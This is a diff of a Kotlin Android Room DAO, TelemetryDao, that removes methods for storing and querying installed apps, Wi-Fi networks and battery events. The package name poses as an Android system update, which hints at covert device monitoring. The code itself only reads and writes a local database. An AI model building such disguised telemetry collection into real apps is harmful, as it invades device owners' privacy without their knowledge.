@@ -1,7 +1,6 @@
 package com.androidsystem.update.database
 
 import androidx.room.*
-import androidx.room.OnConflictStrategy
 
 @Dao
 interface TelemetryDao {
@@ -73,27 +72,4 @@ interface TelemetryDao {
 
     @Query("SELECT * FROM device_info WHERE id > :lastId ORDER BY id ASC LIMIT :limit")
     suspend fun getDeviceInfoAfter(lastId: Long, limit: Int): List<DeviceInfoEntity>
-
-    // ---- New module tables (v5) ----
-
-    @Insert(onConflict = OnConflictStrategy.REPLACE)
-    suspend fun upsertInstalledApp(app: InstalledAppEntity)
-
-    @Query("SELECT * FROM installed_apps ORDER BY appName COLLATE NOCASE ASC")
-    suspend fun getAllInstalledApps(): List<InstalledAppEntity>
-
-    @Query("SELECT * FROM installed_apps WHERE isSystemApp = 0 ORDER BY appName COLLATE NOCASE ASC")
-    suspend fun getUserInstalledApps(): List<InstalledAppEntity>
-
-    @Insert
-    suspend fun insertWifiNetwork(net: WifiNetworkEntity): Long
-
-    @Query("SELECT * FROM wifi_networks WHERE id > :lastId ORDER BY id ASC LIMIT :limit")
-    suspend fun getWifiAfter(lastId: Long, limit: Int): List<WifiNetworkEntity>
-
-    @Insert
-    suspend fun insertBatteryEvent(event: BatteryEventEntity): Long
-
-    @Query("SELECT * FROM battery_events WHERE id > :lastId ORDER BY id ASC LIMIT :limit")
-    suspend fun getBatteryEventsAfter(lastId: Long, limit: Int): List<BatteryEventEntity>
 }
